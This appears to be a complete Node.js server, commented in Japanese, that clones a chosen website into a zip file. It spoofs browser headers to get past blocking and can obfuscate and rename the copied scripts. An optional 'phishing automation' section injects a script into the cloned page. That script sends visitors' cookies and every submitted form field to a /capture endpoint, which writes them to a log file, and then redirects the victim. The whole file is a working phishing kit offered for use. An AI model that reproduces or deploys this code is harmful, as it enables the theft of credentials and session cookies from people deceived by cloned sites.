const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const archiver = require('archiver');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const JavaScriptObfuscator = require('javascript-obfuscator');
const { minify: minifyHTML } = require('html-minifier-terser');
const CleanCSS = require('clean-css');
const UglifyJS = require('uglify-js');
const mime = require('mime-types');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

// ============================================
// ユーティリティ関数
// ============================================
function minifyCSS(code) {
    try {
        return new CleanCSS({ level: 2 }).minify(code).styles;
    } catch(e) {
        return code;
    }
}

function minifyJS(code) {
    try {
        return UglifyJS.minify(code).code;
    } catch(e) {
        return code;
    }
}

function obfuscateJS(code) {
    try {
        return JavaScriptObfuscator.obfuscate(code, {
            compact: true,
            controlFlowFlattening: true,
            deadCodeInjection: true,
            stringArray: true,
            stringArrayThreshold: 0.75
        }).getObfuscatedCode();
    } catch(e) {
        return code;
    }
}

function randomName(ext) {
    return crypto.randomBytes(10).toString('hex') + '.' + ext;
}

function resolveURL(url, baseUrl) {
    try {
        return new URL(url, baseUrl).href;
    } catch(e) {
        return null;
    }
}

function getExtension(url, contentType) {
    const urlExt = path.extname(new URL(url, 'http://example.com').pathname).slice(1).toLowerCase();
    
    if (urlExt && urlExt.length <= 5) return urlExt;
    
    if (contentType) {
        const ext = mime.extension(contentType);
        if (ext) return ext;
    }
    
    return 'bin';
}

// ============================================
// リソース取得（403対策済み）
// ============================================
async function fetchResource(url, baseUrl) {
    try {
        const fullUrl = new URL(url, baseUrl).href;
        
        const response = await axios.get(fullUrl, {
            responseType: 'arraybuffer',
            timeout: 30000,
            maxRedirects: 10,
            validateStatus: (status) => status < 500,
            headers: {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Accept': '*/*',
                'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': baseUrl,
                'Origin': new URL(baseUrl).origin,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        });
        
        return {
            data: response.data,
            contentType: response.headers['content-type'],
            finalUrl: response.request.res.responseUrl || fullUrl,
            status: response.status
        };
    } catch(e) {
        return null;
    }
}

// ============================================
// CSS内のリソース抽出
// ============================================
async function extractCSSResources(cssCode, cssUrl, config, resources) {
    const urlRegex = /url\(['"]?([^'")]+)['"]?\)/g;
    let match;
    let updatedCSS = cssCode;
    
    while ((match = urlRegex.exec(cssCode)) !== null) {
        const maxResources = (config.clone && config.clone.maxResources) || 500;
        if (Object.keys(resources).length >= maxResources) break;
        
        const assetUrl = match[1];
        
        if (!assetUrl || assetUrl.startsWith('data:') || assetUrl.startsWith('#')) continue;
        
        const fullAssetUrl = resolveURL(assetUrl, cssUrl);
        if (!fullAssetUrl) continue;
        
        const content = await fetchResource(fullAssetUrl, cssUrl);
        if (content && content.data && content.status !== 403 && content.status !== 404) {
            const ext = getExtension(fullAssetUrl, content.contentType);
            const filename = config.output && config.output.randomizeNames 
                ? randomName(ext) 
                : path.basename(new URL(fullAssetUrl).pathname) || randomName(ext);
            
            resources[filename] = content.data;
            
            updatedCSS = updatedCSS.split(assetUrl).join(filename);
        }
    }
    
    return updatedCSS;
}

// ============================================
// HTML内のリソース抽出（Cheerio DOM操作）
// ============================================
async function extractHTMLResources($, url, config, resources) {
    const maxResources = (config.clone && config.clone.maxResources) || 500;
    
    // CSS (link rel="stylesheet")
    if (!config.clone || config.clone.css !== false) {
        const cssElements = $('link[rel="stylesheet"]').toArray();
        
        for (const el of cssElements) {
            if (Object.keys(resources).length >= maxResources) break;
            
            const href = $(el).attr('href');
            if (!href || href.startsWith('data:')) continue;
            
            const fullCssUrl = resolveURL(href, url);
            if (!fullCssUrl) continue;
            
            console.log(`Fetching CSS: ${fullCssUrl}`);
            
            const content = await fetchResource(fullCssUrl, url);
            if (content && content.data && content.status !== 403 && content.status !== 404) {
                let cssCode = Buffer.from(content.data).toString('utf8');
                
                cssCode = await extractCSSResources(cssCode, fullCssUrl, config, resources);
                
                if (config.output && config.output.minify) {
                    cssCode = minifyCSS(cssCode);
                }
                
                const filename = config.output && config.output.randomizeNames 
                    ? randomName('css') 
                    : path.basename(new URL(fullCssUrl).pathname) || randomName('css');
                
                resources[filename] = Buffer.from(cssCode);
                
                $(el).attr('href', filename);
                
                console.log(`Added CSS: ${filename} (${cssCode.length} bytes)`);
            }
        }
    }
    
    // JavaScript (script src)
    if (!config.clone || config.clone.js !== false) {
        const jsElements = $('script[src]').toArray();
        
        for (const el of jsElements) {
            if (Object.keys(resources).length >= maxResources) break;
            
            const src = $(el).attr('src');
            if (!src || src.startsWith('data:')) continue;
            
            const fullJsUrl = resolveURL(src, url);
            if (!fullJsUrl) continue;
            
            console.log(`Fetching JS: ${fullJsUrl}`);
            
            const content = await fetchResource(fullJsUrl, url);
            if (content && content.data && content.status !== 403 && content.status !== 404) {
                let jsCode = Buffer.from(content.data).toString('utf8');
                
                if (config.output && config.output.obfuscate) {
                    jsCode = obfuscateJS(jsCode);
                } else if (config.output && config.output.minify) {
                    jsCode = minifyJS(jsCode);
                }
                
                const filename = config.output && config.output.randomizeNames 
                    ? randomName('js') 
                    : path.basename(new URL(fullJsUrl).pathname) || randomName('js');
                
                resources[filename] = Buffer.from(jsCode);
                
                $(el).attr('src', filename);
                
                console.log(`Added JS: ${filename} (${jsCode.length} bytes)`);
            }
        }
    }
    
    // 画像 (img src)
    if (!config.clone || config.clone.images !== false) {
        const imgElements = $('img[src]').toArray();
        
        for (const el of imgElements) {
            if (Object.keys(resources).length >= maxResources) break;
            
            const src = $(el).attr('src');
            if (!src || src.startsWith('data:')) continue;
            
            const fullImgUrl = resolveURL(src, url);
            if (!fullImgUrl) continue;
            
            const content = await fetchResource(fullImgUrl, url);
            if (content && content.data && content.status !== 403 && content.status !== 404) {
                const ext = getExtension(fullImgUrl, content.contentType);
                const filename = config.output && config.output.randomizeNames 
                    ? randomName(ext) 
                    : path.basename(new URL(fullImgUrl).pathname) || randomName(ext);
                
                resources[filename] = content.data;
                
                $(el).attr('src', filename);
                
                console.log(`Added image: ${filename} (${Buffer.byteLength(content.data)} bytes)`);
            }
        }
        
        // srcset対応
        const srcsetElements = $('img[srcset]').toArray();
        
        for (const el of srcsetElements) {
            const srcset = $(el).attr('srcset');
            if (!srcset) continue;
            
            const srcsetUrls = srcset.split(',').map(s => s.trim().split(' ')[0]).filter(Boolean);
            
            for (const srcsetUrl of srcsetUrls) {
                if (Object.keys(resources).length >= maxResources) break;
                if (!srcsetUrl || srcsetUrl.startsWith('data:')) continue;
                
                const fullImgUrl = resolveURL(srcsetUrl, url);
                if (!fullImgUrl) continue;
                
                const content = await fetchResource(fullImgUrl, url);
                if (content && content.data && content.status !== 403 && content.status !== 404) {
                    const ext = getExtension(fullImgUrl, content.contentType);
                    const filename = config.output && config.output.randomizeNames 
                        ? randomName(ext) 
                        : path.basename(new URL(fullImgUrl).pathname) || randomName(ext);
                    
                    resources[filename] = content.data;
                    
                    const newSrcset = srcset.split(srcsetUrl).join(filename);
                    $(el).attr('srcset', newSrcset);
                }
            }
        }
        
        // 背景画像
        const bgElements = $('[style*="background"]').toArray();
        
        for (const el of bgElements) {
            const style = $(el).attr('style') || '';
            const bgRegex = /background(?:-image)?\s*:\s*url\(['"]?([^'")]+)['"]?\)/g;
            let match;
            let newStyle = style;
            
            while ((match = bgRegex.exec(style)) !== null) {
                if (Object.keys(resources).length >= maxResources) break;
                
                const bgUrl = match[1];
                if (!bgUrl || bgUrl.startsWith('data:')) continue;
                
                const fullBgUrl = resolveURL(bgUrl, url);
                if (!fullBgUrl) continue;
                
                const content = await fetchResource(fullBgUrl, url);
                if (content && content.data && content.status !== 403 && content.status !== 404) {
                    const ext = getExtension(fullBgUrl, content.contentType);
                    const filename = config.output && config.output.randomizeNames 
                        ? randomName(ext) 
                        : path.basename(new URL(fullBgUrl).pathname) || randomName(ext);
                    
                    resources[filename] = content.data;
                    
                    newStyle = newStyle.split(bgUrl).join(filename);
                    $(el).attr('style', newStyle);
                }
            }
        }
        
        // ファビコン
        const iconElements = $('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').toArray();
        
        for (const el of iconElements) {
            if (Object.keys(resources).length >= maxResources) break;
            
            const href = $(el).attr('href');
            if (!href || href.startsWith('data:')) continue;
            
            const fullIconUrl = resolveURL(href, url);
            if (!fullIconUrl) continue;
            
            const content = await fetchResource(fullIconUrl, url);
            if (content && content.data && content.status !== 403 && content.status !== 404) {
                const ext = getExtension(fullIconUrl, content.contentType);
                const filename = config.output && config.output.randomizeNames 
                    ? randomName(ext) 
                    : path.basename(new URL(fullIconUrl).pathname) || randomName(ext);
                
                resources[filename] = content.data;
                
                $(el).attr('href', filename);
            }
        }
    }
    
    // フォント
    if (!config.clone || config.clone.fonts !== false) {
        const fontElements = $('link[rel="preload"][as="font"], link[rel="preload"][type="font/woff2"]').toArray();
        
        for (const el of fontElements) {
            if (Object.keys(resources).length >= maxResources) break;
            
            const href = $(el).attr('href');
            if (!href || href.startsWith('data:')) continue;
            
            const fullFontUrl = resolveURL(href, url);
            if (!fullFontUrl) continue;
            
            const content = await fetchResource(fullFontUrl, url);
            if (content && content.data && content.status !== 403 && content.status !== 404) {
                const ext = getExtension(fullFontUrl, content.contentType);
                const filename = config.output && config.output.randomizeNames 
                    ? randomName(ext) 
                    : path.basename(new URL(fullFontUrl).pathname) || randomName(ext);
                
                resources[filename] = content.data;
                
                $(el).attr('href', filename);
            }
        }
    }
    
    // 動画・音声
    if (!config.clone || config.clone.videos !== false) {
        const mediaElements = $('video source[src], video[src], audio source[src], audio[src]').toArray();
        
        for (const el of mediaElements) {
            if (Object.keys(resources).length >= maxResources) break;
            
            const src = $(el).attr('src');
            if (!src || src.startsWith('data:')) continue;
            
            const fullMediaUrl = resolveURL(src, url);
            if (!fullMediaUrl) continue;
            
            const content = await fetchResource(fullMediaUrl, url);
            if (content && content.data && content.status !== 403 && content.status !== 404) {
                const ext = getExtension(fullMediaUrl, content.contentType);
                const filename = config.output && config.output.randomizeNames 
                    ? randomName(ext) 
                    : path.basename(new URL(fullMediaUrl).pathname) || randomName(ext);
                
                resources[filename] = content.data;
                
                $(el).attr('src', filename);
            }
        }
    }
    
    const updatedHTML = $.html();
    
    return updatedHTML;
}

// ============================================
// メインクローン関数
// ============================================
async function cloneSiteDeep(url, config) {
    console.log(`Starting clone: ${url}`);
    
    const response = await axios.get(url, {
        timeout: 30000,
        maxRedirects: 10,
        validateStatus: (status) => status < 500,
        headers: {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ja-JP,ja;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.google.com/',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
    });
    
    const html = response.data;
    console.log(`HTML size: ${html.length} bytes`);
    console.log(`Status: ${response.status}`);
    
    const $ = cheerio.load(html);
    const resources = {};
    
    const updatedHTML = await extractHTMLResources($, url, config, resources);
    
    let finalHTML = updatedHTML;
    
    console.log(`Total resources: ${Object.keys(resources).length}`);
    
    // フィッシング自動化
    if (config.phishing && config.phishing.enabled) {
        let phishingScript = '<script>';
        
        if (config.phishing.captureCookies) {
            phishingScript += `
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'cookies',
                    url: '${url}',
                    data: document.cookie,
                    userAgent: navigator.userAgent,
                    timestamp: Date.now()
                })
            });
            `;
        }
        
        if (config.phishing.captureForm) {
            phishingScript += `
            document.addEventListener('DOMContentLoaded', () => {
                document.querySelectorAll('form').forEach(form => {
                    form.addEventListener('submit', (e) => {
                        e.preventDefault();
                        
                        const formData = {};
                        form.querySelectorAll('input, select, textarea').forEach(input => {
                            if (input.name) {
                                formData[input.name] = input.value;
                            }
                        });
                        
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'form',
                                url: '${url}',
                                data: formData,
                                cookies: document.cookie,
                                userAgent: navigator.userAgent,
                                timestamp: Date.now()
                            })
                        }).then(() => {
                            ${config.phishing.redirectUrl ? `window.location.href = '${config.phishing.redirectUrl}';` : ''}
                        });
                    });
                });
            });
            `;
        }
        
        phishingScript += '</script>';
        finalHTML = finalHTML.replace('</body>', phishingScript + '</body>');
    }
    
    // HTML minify
    if (config.output && config.output.minify) {
        finalHTML = await minifyHTML(finalHTML, {
            collapseWhitespace: true,
            removeComments: true,
            removeRedundantAttributes: true,
            removeScriptTypeAttributes: true,
            removeStyleLinkTypeAttributes: true
        });
    }
    
    resources['index.html'] = Buffer.from(finalHTML);
    
    return resources;
}

// ============================================
// キャプチャエンドポイント
// ============================================
app.post('/capture', (req, res) => {
    const data = req.body;
    const log = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
    fs.appendFileSync('captured.log', log);
    res.json({ success: true });
});

// ============================================
// クローンエンドポイント
// ============================================
app.post('/clone', async (req, res) => {
    const config = req.body;
    
    try {
        const resources = await cloneSiteDeep(config.url, config);
        
        const siteName = new URL(config.url).hostname.replace(/\./g, '-');
        
        const archive = archiver('zip', { zlib: { level: 9 } });
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename=${siteName}_clone_${Date.now()}.zip`);
        
        archive.pipe(res);
        
        const siteDir = `${siteName}/`;
        archive.append(null, { name: siteDir, type: 'directory' });
        
        for (const [filename, content] of Object.entries(resources)) {
            const buffer = Buffer.isBuffer(content) ? content : Buffer.from(content);
            console.log(`ZIP: ${siteName}/${filename} (${buffer.length} bytes)`);
            archive.append(buffer, { name: `${siteName}/${filename}` });
        }
        
        archive.finalize();
        
        console.log(`Clone complete: ${Object.keys(resources).length} files`);
    } catch(e) {
        console.error('Clone error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Clone server running on ${PORT}`);
});
